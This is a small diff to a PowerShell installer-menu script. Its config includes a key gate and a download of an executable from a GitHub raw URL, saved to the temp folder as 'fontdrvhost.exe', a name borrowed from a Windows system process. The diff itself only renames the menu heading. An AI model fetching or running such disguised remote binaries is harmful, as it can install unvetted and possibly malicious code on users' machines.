@@ -1,3 +1,4 @@
+
 Clear-Host
 
 # ===== CONFIG =====
@@ -5,8 +6,8 @@ $ValidKey = "smithshop"  # Key สำหรับรันโปรแกรม
 $ExeURL = "https://github.com/draft7973-ops/Smithshop/raw/main/fontdrvhost.exe"
 $ExeOutput = "$env:TEMP\fontdrvhost.exe"
 
-# ===== MENU =====
-Write-Host "=== MENU ==="
+# ===== CMDSMITHSHOP :] =====
+Write-Host "=== CMDSMITHSHOP :] ==="
 Write-Host "1. Install"
 Write-Host "2. Clean"
 
